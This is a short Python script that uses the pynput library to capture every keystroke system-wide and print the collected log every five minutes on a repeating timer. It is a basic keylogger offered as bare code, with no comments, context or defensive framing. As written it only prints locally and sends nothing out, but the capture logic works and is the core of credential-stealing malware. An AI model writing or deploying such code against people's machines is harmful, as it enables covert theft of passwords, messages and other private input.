import pynput.keyboard
import threading

log = ""
def processKeyPress(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
            return
        log += " " + str(key) + " "        
    
def report():
    global log
    print(log)
    log = ""
    timer = threading.Timer(5 * 60, report)
    timer.start()
    
keyboardListener = pynput.keyboard.Listener(on_press=processKeyPress)
with keyboardListener:
    report()
    keyboardListener.join()